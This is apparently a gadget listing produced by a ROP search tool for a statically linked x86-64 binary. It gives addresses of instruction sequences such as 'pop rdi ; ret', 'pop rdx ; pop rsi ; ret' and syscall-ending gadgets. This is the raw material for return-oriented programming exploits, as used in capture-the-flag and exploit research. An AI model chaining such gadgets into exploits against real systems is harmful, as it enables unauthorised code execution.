0x00000000004a8ee5 : pop rbp ; insb byte ptr [rdi], dx ; shr byte ptr [rdx], 0x43 ; add cl, bl ; retf 0xea91
0x0000000000416fd0 : pop rbp ; jmp rax
0x0000000000475798 : pop rbp ; mov eax, 0x101 ; syscall
0x0000000000486d13 : pop rbp ; mov eax, 0x89fd8945 ; ret 0xe283
0x0000000000400a8b : pop rbp ; mov edi, 0x6babd0 ; jmp rax
0x000000000042416a : pop rbp ; mov rdi, rax ; jmp 0x40043e
0x00000000004a7840 : pop rbp ; movsd dword ptr [rdi], dword ptr [rsi] ; xchg eax, ebp ; retf 0x33e6
0x0000000000488bef : pop rbp ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000044ea6f : pop rbp ; pop r12 ; jmp 0x45b4e5
0x000000000044afe0 : pop rbp ; pop r12 ; jmp rax
0x000000000044afc5 : pop rbp ; pop r12 ; mov esi, 2 ; jmp rax
0x00000000004207e8 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rax
0x0000000000422d0b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rcx
0x00000000004219b5 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x000000000040067e : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000410a8d : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000040db88 : pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000405e93 : pop rbp ; pop r12 ; ret
0x00000000004207ec : pop rbp ; pop r14 ; jmp rax
0x0000000000422d0f : pop rbp ; pop r14 ; jmp rcx
0x00000000004219b9 : pop rbp ; pop r14 ; pop r15 ; jmp rax
0x00000000004026a1 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000400682 : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004101fc : pop rbp ; pop r14 ; pop rbp ; ret
0x0000000000410a91 : pop rbp ; pop r14 ; ret
0x00000000004845b8 : pop rbp ; pop rbx ; ret
0x0000000000400a98 : pop rbp ; ret
0x00000000004942e1 : pop rbp ; stc ; push qword ptr [rax + 0x5e] ; stc ; jmp rax
0x00000000004131b4 : pop rbp ; sub al, byte ptr [rax] ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x0000000000485201 : pop rbx ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000048c68d : pop rbx ; add dword ptr [rax + 1], ecx ; retf
0x00000000004a6838 : pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x0000000000448ab6 : pop rbx ; and eax, 0x7ff80000 ; ret
0x00000000004a6836 : pop rbx ; cmc ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x0000000000416f14 : pop rbx ; jmp rax
0x000000000046d8b8 : pop rbx ; loopne 0x46d8c2 ; dec dword ptr [rcx + 0x63] ; ret
0x000000000047fe47 : pop rbx ; mov eax, dword ptr fs:[rax] ; ret
0x0000000000448b01 : pop rbx ; mov eax, eax ; ret
0x0000000000410eef : pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000046603d : pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x0000000000417a59 : pop rbx ; mov ecx, edx ; xor edx, edx ; jmp rax
0x000000000041b473 : pop rbx ; mov rax, rdi ; pop rbp ; pop r12 ; ret
0x00000000004101f8 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000045842c : pop rbx ; pop r12 ; ret
0x000000000048ad19 : pop rbx ; pop r14 ; ret
0x0000000000416fcf : pop rbx ; pop rbp ; jmp rax
0x0000000000424169 : pop rbx ; pop rbp ; mov rdi, rax ; jmp 0x40043f
0x000000000044ea6e : pop rbx ; pop rbp ; pop r12 ; jmp 0x45b4e6
0x0000000000470ee1 : pop rbx ; pop rbp ; pop r12 ; jmp rax
0x000000000044afc4 : pop rbx ; pop rbp ; pop r12 ; mov esi, 2 ; jmp rax
0x00000000004207e7 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rax
0x0000000000422d0a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rcx
0x0000000000410ac4 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000040db87 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000405e92 : pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000401c96 : pop rbx ; pop rbp ; ret
0x0000000000400e88 : pop rbx ; ret
0x00000000004a9b20 : pop rbx ; ret 0x6f9
0x00000000004a6ffd : pop rbx ; retf
0x000000000044e9b0 : pop rbx ; shl eax, cl ; pop rbp ; pop r12 ; ret
0x0000000000405eae : pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x0000000000417a22 : pop rbx ; xor edx, edx ; jmp rax
0x000000000042a8a7 : pop rcx ; add dword ptr [rax], eax ; add byte ptr [rbp - 0x77], cl ; retf
0x0000000000461120 : pop rcx ; and eax, 0x48b4800 ; clc ; jmp rax
0x000000000042af87 : pop rcx ; or al, byte ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000041d4e3 : pop rcx ; ret
0x0000000000423dac : pop rcx ; sub dword ptr [rax], eax ; add rsp, 0x20 ; call 0x410849
0x000000000042e7d8 : pop rdi ; adc byte ptr [rdx + 8], dh ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000044061d : pop rdi ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004301f9 : pop rdi ; in al, dx ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000430009 : pop rdi ; in eax, dx ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004a8dde : pop rdi ; insd dword ptr [rdi], dx ; test eax, 0x7d4c8c5d ; ret 0xd8f
0x00000000004219bd : pop rdi ; jmp rax
0x00000000004a7da1 : pop rdi ; mov dh, 0x4e ; ret 0x474c
0x000000000045a08d : pop rdi ; mov esi, 0xf883fffa ; inc dword ptr [rcx - 0x77] ; ret 0x840f
0x000000000044bcb2 : pop rdi ; mov rdi, qword ptr [r13] ; call r12
0x000000000044b1d9 : pop rdi ; or byte ptr [rcx - 0x77], cl ; retf
0x000000000044b1a5 : pop rdi ; or byte ptr [rcx - 0xa], al ; ret
0x000000000042fe29 : pop rdi ; out dx, al ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000042fc59 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
0x000000000042fd55 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x000000000042fca1 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004026a5 : pop rdi ; pop rbp ; ret
0x0000000000400686 : pop rdi ; ret
0x000000000042b486 : pop rdx ; add eax, 0x83480000 ; ret 0x4910
0x00000000004a89c1 : pop rdx ; je 0x4a898b ; ret 0xacfc
0x00000000004a8ad3 : pop rdx ; leave ; retf
0x00000000004a9987 : pop rdx ; out 0xf5, eax ; mov ch, 0xab ; ret
0x000000000044c6b4 : pop rdx ; pop r10 ; ret
0x0000000000481d27 : pop rdx ; pop rbx ; ret
0x000000000044c6d9 : pop rdx ; pop rsi ; ret
0x000000000044a155 : pop rdx ; ret
0x000000000041424a : pop rdx ; ret 0xfffe
0x00000000004a89a3 : pop rdx ; retf
0x00000000004a94f0 : pop rdx ; sub ah, ah ; mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x000000000042cfc4 : pop rsi ; adc byte ptr [rsi + 0xf], ah ; jmp 0x42cf9a
0x000000000042d042 : pop rsi ; adc byte ptr [rsi + 0xf], ah ; jmp 0x42d018
0x000000000042d4d4 : pop rsi ; adc byte ptr [rsi + 0xf], ah ; jmp 0x42d4aa
0x000000000042d552 : pop rsi ; adc byte ptr [rsi + 0xf], ah ; jmp 0x42d528
0x000000000044051e : pop rsi ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000420cb6 : pop rsi ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x00000000004609d9 : pop rsi ; and eax, 0x48b4800 ; clc ; jmp rax
0x0000000000458bc6 : pop rsi ; cmp byte ptr [rcx - 0x77], cl ; push rsi ; sub byte ptr [rax - 0x3f], cl ; retf
0x00000000004207ee : pop rsi ; jmp rax
0x0000000000422d11 : pop rsi ; jmp rcx
0x00000000004967f4 : pop rsi ; js 0x4967f5 ; call qword ptr [rdi]
0x000000000044bc82 : pop rsi ; mov rdi, qword ptr [r13] ; call r12
0x00000000004219bb : pop rsi ; pop r15 ; jmp rax
0x00000000004026a3 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000400684 : pop rsi ; pop r15 ; ret
0x00000000004101fe : pop rsi ; pop rbp ; ret
0x0000000000410a93 : pop rsi ; ret
0x00000000004942e5 : pop rsi ; stc ; jmp rax
0x000000000043e0b0 : pop rsp ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042b784 : pop rsp ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000043edb0 : pop rsp ; add eax, 0x83480000 ; ret 0xe910
0x0000000000463540 : pop rsp ; add eax, 0xf660004 ; outsd dx, dword ptr [rsi] ; ret 0x3e8
0x000000000041d2ab : pop rsp ; and al, 0x10 ; mov qword ptr [rsp + 8], rax ; call rcx
0x0000000000460e32 : pop rsp ; and eax, 0x48b4800 ; clc ; jmp rax
0x000000000044ea71 : pop rsp ; jmp 0x45b4e3
0x000000000044afe2 : pop rsp ; jmp rax
0x000000000044afc7 : pop rsp ; mov esi, 2 ; jmp rax
0x00000000004207ea : pop rsp ; pop r13 ; pop r14 ; jmp rax
0x0000000000422d0d : pop rsp ; pop r13 ; pop r14 ; jmp rcx
0x00000000004219b7 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x000000000040269f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000400680 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004101fa : pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
0x0000000000410a8f : pop rsp ; pop r13 ; pop r14 ; ret
0x000000000040db8a : pop rsp ; pop r13 ; ret
0x00000000004b16b8 : pop rsp ; pop rbp ; add byte ptr [rax], al ; and al, 0x79 ; cli ; call qword ptr [rdx]
0x0000000000401e43 : pop rsp ; ret
0x0000000000401f06 : pop rsp ; retf
0x0000000000482a8a : pop rsp ; retf 0x4df0
0x00000000004b11a4 : pop rsp ; sbb al, 0xfa ; call rcx
0x00000000004a8b47 : pop rsp ; sbb ebp, ebx ; retf
0x000000000046ffcc : popfq ; add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; retf
0x00000000004101a4 : popfq ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000046abad : popfq ; call 0xffffffffc3caabb7
0x000000000046a8ef : popfq ; idiv edi ; dec dword ptr [rax - 0x77] ; ret
0x00000000004a8acc : popfq ; jrcxz 0x4a8a91 ; add dword ptr [rdx - 0x36a5831f], esp ; retf
0x0000000000460e7f : popfq ; pop rsp ; and eax, 0x48b4800 ; clc ; jmp rax
0x000000000048c85e : popfq ; ret 0xf45
0x000000000040958f : popfq ; retf
0x00000000004a9882 : popfq ; retf 0xde4f
0x00000000004b00b1 : popfq ; stc ; jmp qword ptr [rcx]
0x00000000004943c1 : popfq ; stc ; jmp qword ptr [rsi]
0x0000000000495a68 : popfq ; sti ; jmp qword ptr [rcx]
0x0000000000435b82 : psllq mm1, qword ptr [r15] ; jg 0x435b9d ; ret
0x00000000004386a2 : psllq mm1, qword ptr [r15] ; jg 0x4386bd ; ret
0x0000000000435b83 : psllq mm1, qword ptr [rdi] ; jg 0x435b9c ; ret
0x00000000004386a3 : psllq mm1, qword ptr [rdi] ; jg 0x4386bc ; ret
0x0000000000444b96 : psllq mm1, qword ptr [rdi] ; jg 0x444baa ; mov dword ptr [rdi + 0xf], ecx ; ret
0x0000000000444b95 : psllq mm1, qword ptr [rdi] ; jg 0x444bab ; mov dword ptr [rdi + 0xf], ecx ; ret
0x0000000000444bf7 : psllq mm1, qword ptr [rdi] ; jg 0x444c0c ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00000000004b0c18 : psubw mm6, mm4 ; jmp qword ptr [rbx]
0x000000000049423d : psubw mm7, mm7 ; add byte ptr [rdi], ah ; stc ; jmp qword ptr [rax]
0x00000000004a78a4 : push -0x30 ; retf 0xe72e
0x00000000004a6f2e : push -0x51 ; xlatb ; out 0xb3, al ; retf 0xe80
0x0000000000495ae8 : push -0x510004bd ; sti ; jmp rdx
0x00000000004a90d5 : push -0x57d3205 ; call 0xffffffffab585bd5
0x00000000004a70e1 : push -0x5e ; cld ; shr al, cl ; add al, 0x3d ; retf
0x000000000045e2e2 : push -0x7c000003 ; ret
0x00000000004454b4 : push -0x9ffffff ; ret 0x7501
0x00000000004acf25 : push -0xa ; jmp rdx
0x00000000004499be : push -5 ; dec dword ptr [rax - 0x77] ; ret
0x00000000004a88d5 : push 0x1b6e41b5 ; std ; retf
0x00000000004967b8 : push 0x1efffb76 ; jns 0x4967c1 ; jmp rsi
0x00000000004af9c4 : push 0x38000040 ; stc ; jmp qword ptr [rbx]
0x000000000041251d : push 0x48 ; add esp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00000000004885e4 : push 0x4800001f ; mov dword ptr [rbx + 0x20], eax ; pop rbx ; ret
0x0000000000479c15 : push 0x48b4901 ; and al, 0x83 ; ret
0x0000000000458ecc : push 0x4cffffff ; mov edi, esi ; call rdx
0x00000000004b03c4 : push 0x5800004a ; stosd dword ptr [rdi], eax ; stc ; jmp qword ptr [rcx]
0x00000000004a9562 : push 0x6e ; ja 0x4a94ed ; ret 0x48f
0x0000000000418065 : push 0x74c98548 ; and cl, byte ptr [rax + 0x39] ; retf
0x0000000000416947 : push 0x74c98548 ; sub byte ptr [rax + 0x39], cl ; retf
0x0000000000417c8a : push 0x75c08548 ; ret
0x00000000004af6c4 : push 0x7800003d ; sal bh, 1 ; call rsp
0x00000000004a8e42 : push 0xfd4cbe ; retf 0xf64
0x0000000000409f2e : push 1 ; add cl, ch ; retf
0x0000000000494f7b : push qword ptr [rax + 0x2f] ; cli ; jmp rsi
0x0000000000494803 : push qword ptr [rax + 0x40fffa19] ; sbb edx, edi ; call rax
0x00000000004942e3 : push qword ptr [rax + 0x5e] ; stc ; jmp rax
0x0000000000494a73 : push qword ptr [rax + 0xa] ; cli ; jmp rax
0x0000000000494c77 : push qword ptr [rax + 9] ; cli ; jmp rax
0x0000000000495363 : push qword ptr [rax - 0x3f000509] ; idiv edx ; call rax
0x00000000004945ef : push qword ptr [rax - 0x51] ; stc ; inc eax ; mov al, 0xf9 ; call qword ptr [rax]
0x0000000000495323 : push qword ptr [rax - 0x52] ; cli ; inc eax ; scasd eax, dword ptr [rdi] ; cli ; call qword ptr [rax]
0x00000000004947bf : push qword ptr [rax - 0x7f00063a] ; leave ; stc ; call rax
0x0000000000494a3b : push qword ptr [rax] ; adc edi, edx ; call rax
0x0000000000494f47 : push qword ptr [rax] ; cli ; jmp qword ptr [rax + 0x20fffa35]
0x000000000049464b : push qword ptr [rax] ; in eax, 0xf9 ; call qword ptr [rax]
0x000000000048e1fd : push qword ptr [rax] ; jne 0x48e230 ; mov rax, qword ptr [rsi + 0x10] ; ret
0x000000000048f05d : push qword ptr [rax] ; jne 0x48f090 ; mov rax, qword ptr [rsi + 0x10] ; ret
0x0000000000496243 : push qword ptr [rax] ; jno 0x496246 ; call qword ptr [rax]
0x000000000049454b : push qword ptr [rax] ; mov esp, 0xbe10fff9 ; stc ; jmp rax
0x0000000000494317 : push qword ptr [rax] ; outsb dx, byte ptr [rsi] ; stc ; jmp qword ptr [rax]
0x0000000000495313 : push qword ptr [rax] ; test eax, 0xaa80fffa ; cli ; call rax
0x0000000000495133 : push qword ptr [rax] ; xor dl, bh ; jmp qword ptr [rax + 0x10fffa2f]
0x0000000000446e38 : push qword ptr [rbp + 0x1a] ; xor eax, eax ; ret
0x000000000044b078 : push qword ptr [rbp + 0x35] ; mov rdi, qword ptr [rbp] ; call r12
0x000000000044b050 : push qword ptr [rbp + 0x3d] ; mov rdi, qword ptr [rbp] ; call r12
0x000000000044bc80 : push qword ptr [rbp + 0x5e] ; mov rdi, qword ptr [r13] ; call r12
0x000000000044bcb0 : push qword ptr [rbp + 0x5f] ; mov rdi, qword ptr [r13] ; call r12
0x000000000042c849 : push qword ptr [rbp + 4] ; vzeroupper ; ret
0x0000000000471a28 : push qword ptr [rbp + rax + 0x5b] ; pop rbp ; pop r12 ; ret
0x0000000000417a8d : push qword ptr [rbp + rax - 0xa] ; ret 0x7401
0x0000000000471a4e : push qword ptr [rbp + rax - 0xa] ; ret 0x7408
0x0000000000417ef6 : push qword ptr [rbp + rcx - 0x18] ; ret 0x8a
0x000000000047f4fb : push qword ptr [rbp - 0x2e] ; ret
0x00000000004182c0 : push qword ptr [rbp - 0x44] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004614fb : push qword ptr [rbp - 0x4b8] ; push rax ; call 0x45d7a9
0x00000000004498ec : push qword ptr [rbx + 1] ; ret
0x0000000000495ba3 : push qword ptr [rbx + rax*2] ; sti ; inc dword ptr [rbx + rax*2 - 5] ; jmp qword ptr [rcx]
0x0000000000495993 : push qword ptr [rbx + rax*2] ; sti ; jmp qword ptr [rcx]
0x000000000049598f : push qword ptr [rbx + rax*2] ; sti ; push qword ptr [rbx + rax*2] ; sti ; jmp qword ptr [rcx]
0x00000000004a4fcb : push qword ptr [rbx] ; xchg ch, bh ; inc eax ; jne 0x4a4fd8 ; call qword ptr [rax]
0x00000000004943ab : push qword ptr [rcx + 0x41fff99a] ; wait ; stc ; call rcx
0x00000000004943b7 : push qword ptr [rcx - 0x64] ; stc ; call qword ptr [rcx]
0x000000000045ec64 : push qword ptr [rcx] ; fcmovnb st(0), st(6) ; test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x000000000047a2ff : push qword ptr [rcx] ; fucomi st(3) ; ret 0x1f0f
0x000000000041606f : push qword ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x0000000000455883 : push qword ptr [rcx] ; ror byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000459cdd : push qword ptr [rcx] ; shr cl, cl ; retf
0x000000000044993b : push qword ptr [rdi + 0x22] ; hlt ; mov edi, edx ; mov eax, r8d ; syscall
0x000000000044a4f6 : push qword ptr [rdi + 0x3f] ; ret
0x000000000044a226 : push qword ptr [rdi + 0x57] ; ret
0x000000000044a153 : push qword ptr [rdi + 0x5a] ; ret
0x000000000045b852 : push qword ptr [rdi + 0xb] ; ret
0x0000000000449efa : push qword ptr [rdi + 3] ; ret
0x000000000044a1e9 : push qword ptr [rdi + 4] ; ret
0x0000000000449f48 : push qword ptr [rdi + 5] ; ret
0x000000000047571e : push qword ptr [rdi + 7] ; ret
0x000000000044acc5 : push qword ptr [rdi + 8] ; ret
0x000000000044a2bc : push qword ptr [rdi + 9] ; ret
0x00000000004755d4 : push qword ptr [rdi + rax*2 - 0x77] ; ret 0xe283
0x00000000004948ef : push qword ptr [rdx + 0x42fffa14] ; adc al, 0xfa ; call rdx
0x0000000000494de7 : push qword ptr [rdx + 0x42fffa3b] ; cmp edi, edx ; call rdx
0x0000000000495a2b : push qword ptr [rdx + 0x43] ; sti ; jmp qword ptr [rcx]
0x0000000000494eaf : push qword ptr [rdx + rdi + 0x3a44fffa] ; cli ; call rsp
0x000000000049484b : push qword ptr [rsi + 0x46fffa18] ; sbb dl, bh ; call rsi
0x0000000000496267 : push qword ptr [rsi + rbp*2 + 0x6eb4fffb] ; sti ; jmp qword ptr [rax]
0x0000000000496273 : push qword ptr [rsi + rbp*2 + 0x6ff8fffb] ; sti ; call rax
0x000000000047852a : push qword ptr [rsi + rbx - 0x17] ; retf
0x0000000000411cf6 : push qword ptr [rsp + rcx - 0x18] ; ret 0xec
0x0000000000416ec2 : push r8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00000000004a6f8c : push r8 ; xor byte ptr [rcx], ah ; retf
0x0000000000470b2a : push rax ; adc byte ptr [rax - 0x77], cl ; ret
0x0000000000418c71 : push rax ; adc byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x0000000000494200 : push rax ; adc cl, bh ; call qword ptr [rax - 0x2f0006ef]
0x000000000041ccfd : push rax ; adc dh, dh ; ret 0xf0f
0x0000000000494210 : push rax ; adc eax, 0x1690fff9 ; stc ; call rax
0x000000000045573f : push rax ; add al, 0xe9 ; cmp eax, 0x89fffff3 ; retf 0xe283
0x00000000004b00ac : push rax ; add byte ptr [r8], r8b ; mov al, 0x9d ; stc ; jmp qword ptr [rcx]
0x0000000000416ec3 : push rax ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00000000004241ec : push rax ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x00000000004b09b1 : push rax ; add byte ptr [rax], al ; mov ebx, ss ; stc ; jmp qword ptr [rdx]
0x00000000004b03ac : push rax ; add byte ptr [rax], al ; stosd dword ptr [rdi], eax ; stc ; jmp qword ptr [rcx]
0x0000000000400fd0 : push rax ; and byte ptr [rax + 1], cl ; ret 0xb70f
0x0000000000487852 : push rax ; and eax, dword ptr [rax] ; jne 0x487884 ; ret
0x0000000000451a6f : push rax ; call 0x44dd43
0x0000000000461501 : push rax ; call 0x45d7a3
0x000000000044f148 : push rax ; call rbx
0x000000000049539f : push rax ; clc ; cli ; call qword ptr [rax]
0x00000000004953cb : push rax ; cld ; cli ; inc dword ptr [rax] ; std ; cli ; call qword ptr [rax]
0x0000000000495104 : push rax ; cli ; call rax
0x000000000049523b : push rax ; cli ; inc dword ptr [rax] ; cli ; call qword ptr [rax]
0x0000000000494d24 : push rax ; cmp al, 0xfa ; jmp rax
0x0000000000470654 : push rax ; cmp byte ptr [rax + 1], cl ; ret
0x0000000000495373 : push rax ; idiv edx ; inc dword ptr [rax] ; clc ; cli ; call qword ptr [rax]
0x0000000000494770 : push rax ; in eax, 0xf9 ; jmp qword ptr [rax]
0x0000000000494327 : push rax ; jno 0x494328 ; jmp rax
0x0000000000496240 : push rax ; jno 0x496245 ; push qword ptr [rax] ; jno 0x496249 ; call qword ptr [rax]
0x0000000000494648 : push rax ; jrcxz 0x49464b ; push qword ptr [rax] ; in eax, 0xf9 ; call qword ptr [rax]
0x0000000000472079 : push rax ; lea r9, [rsp + 0x18] ; mov rdi, r12 ; call rbx
0x00000000004a6ffa : push rax ; lodsb al, byte ptr [rsi] ; xchg eax, edx ; pop rbx ; retf
0x00000000004946c3 : push rax ; loopne 0x4946c4 ; call rax
0x00000000004944e0 : push rax ; mov bh, 0xf9 ; call qword ptr [rax]
0x0000000000451381 : push rax ; mov dword ptr [rax + 0x54], edx ; ret
0x00000000004945ac : push rax ; mov ebx, 0xbd40fff9 ; stc ; call qword ptr [rax]
0x00000000004944a4 : push rax ; mov ecx, 0xbb30fff9 ; stc ; call qword ptr [rax]
0x0000000000494548 : push rax ; mov edx, 0xbc30fff9 ; stc ; call qword ptr [rax]
0x0000000000494530 : push rax ; mov esi, 0xc020fff9 ; stc ; jmp qword ptr [rax]
0x00000000004944af : push rax ; mov esi, 0xc0e0fff9 ; stc ; jmp rax
0x0000000000485a31 : push rax ; or byte ptr [rax - 0x73], cl ; or al, 0xca ; jmp 0x485a49
0x00000000004199f2 : push rax ; or byte ptr [rax - 0x75], cl ; adc byte ptr [rcx - 0x7d], al ; ret
0x000000000041ad1a : push rax ; or byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x840f
0x000000000044b99d : push rax ; or byte ptr [rbx + 0x94801e2], al ; ret 0x8949
0x000000000041d6f5 : push rax ; or byte ptr [rcx - 0xa], al ; ret 0xf04
0x000000000044d79b : push rax ; or dh, dh ; ret 0x8902
0x000000000041e432 : push rax ; or dh, dh ; ret 0xf02
0x00000000004824de : push rax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000488695 : push rax ; pop rbx ; ret
0x0000000000478529 : push rax ; push qword ptr [rsi + rbx - 0x17] ; retf
0x0000000000451383 : push rax ; push rsp ; ret
0x00000000004a98a0 : push rax ; retf
0x0000000000494220 : push rax ; sbb bh, cl ; call qword ptr [rax - 0x2f0006e5]
0x000000000041c054 : push rax ; sbb byte ptr [rax + 0x39], cl ; retf 0x850f
0x0000000000418c66 : push rax ; sbb byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x0000000000471b69 : push rax ; sbb byte ptr [rcx + 0x5bc0310b], cl ; ret
0x0000000000494a04 : push rax ; sbb edx, edi ; jmp rax
0x00000000004a6f8d : push rax ; xor byte ptr [rcx], ah ; retf
0x000000000048a11a : push rbp ; add bl, ch ; add eax, 0x1489066 ; ret 0xb70f
0x000000000048cbc2 : push rbp ; add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x00000000004b0f55 : push rbp ; add byte ptr [rax], al ; call 0x114b0967
0x00000000004001be : push rbp ; add byte ptr [rsi], dh ; xor edi, ebp ; retf 0x6500
0x000000000047fc68 : push rbp ; add dword ptr [rax + 0x39], ecx ; ret 0x1272
0x0000000000410cfd : push rbp ; cmp byte ptr [rax + 0x39], cl ; ret
0x000000000048169c : push rbp ; or byte ptr [rcx + 0x33], cl ; add byte ptr [r8 + 9], r9b ; ret 0x840f
0x00000000004754fd : push rbp ; push rbx ; mov rbx, rsi ; sub rsp, 8 ; syscall
0x0000000000478477 : push rbp ; ret
0x00000000004112a6 : push rbx ; adc byte ptr [rax + 1], cl ; ret 0x2b48
0x000000000040111f : push rbx ; adc byte ptr [rax - 0x7d], cl ; ret
0x000000000047fadf : push rbx ; adc byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000484db7 : push rbx ; add al, 0xf ; mov dh, 0xc0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004a9179 : push rbx ; call 0x4c14bb36
0x0000000000449b41 : push rbx ; cld ; dec dword ptr [rax - 0x77] ; ret 0x8b48
0x0000000000413708 : push rbx ; cmp byte ptr [rax + 0x39], cl ; ret 0x2175
0x0000000000448025 : push rbx ; jb 0x448035 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000471a62 : push rbx ; je 0x471ac6 ; pop rbp ; pop r12 ; ret
0x0000000000471aee : push rbx ; je 0x471b52 ; pop rbp ; pop r12 ; ret
0x000000000047d8e3 : push rbx ; js 0x47d8f1 ; add byte ptr [rax + 0x15], bh ; syscall
0x00000000004754fe : push rbx ; mov rbx, rsi ; sub rsp, 8 ; syscall
0x0000000000413704 : push rbx ; or byte ptr [rax + 0x2b], cl ; push rbx ; cmp byte ptr [rax + 0x39], cl ; ret 0x2175
0x0000000000460ec9 : push rbx ; push rdi ; and eax, 0x48b4800 ; clc ; jmp rax
0x000000000044bbaf : push rbx ; ret
0x00000000004a89bc : push rbx ; xchg eax, edx ; jae 0x4a899b ; push rsi ; pop rdx ; je 0x4a8990 ; ret 0xacfc
0x000000000041f312 : push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x1f77
0x000000000041b64b : push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x870f
0x000000000041b9c7 : push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0xb277
0x00000000004b0a95 : push rcx ; add byte ptr [rax], al ; sub al, ah ; stc ; call qword ptr [rax]
0x000000000044c04b : push rcx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00000000004a7c45 : push rcx ; call qword ptr [rsi]
0x00000000004ab991 : push rcx ; cmc ; call qword ptr [rbx]
0x000000000045e756 : push rcx ; cmp byte ptr [rax + 0x39], cl ; ret
0x0000000000438fdd : push rcx ; jl 0x43902e ; adc dword ptr [rcx - 1], edi ; ret
0x0000000000439144 : push rcx ; jl 0x439195 ; adc dword ptr [rcx + 7], edi ; ret
0x000000000042e1e3 : push rcx ; mov edi, 0x39480028 ; retf 0x8949
0x0000000000479291 : push rcx ; or byte ptr [rcx + 0x33], cl ; add dword ptr [rax + 9], ecx ; ret 0x1475
0x0000000000479263 : push rcx ; or byte ptr [rcx + 0x33], cl ; add dword ptr [rax + 9], ecx ; ret 0xe75
0x000000000041600b : push rcx ; ret 0xffff
0x000000000044fdd3 : push rcx ; retf
0x0000000000402eab : push rcx ; rol byte ptr [rcx], cl ; add byte ptr [rax - 0x77], cl ; ret 0x7ce9
0x000000000041a15d : push rcx ; sbb byte ptr [rcx + 1], cl ; ret 0x8d48
0x000000000044c990 : push rcx ; xchg eax, ebp ; add al, 0 ; mov eax, 0x15 ; syscall
0x000000000040403e : push rdi ; adc al, 0xf ; retf 0xfa83
0x000000000044b438 : push rdi ; adc byte ptr [rax - 0x7d], cl ; retf 0x4901
0x000000000040402e : push rdi ; adc byte ptr [rdi], cl ; retf 0xd289
0x00000000004450da : push rdi ; add al, 0x48 ; lea eax, [rdi + 5] ; ret
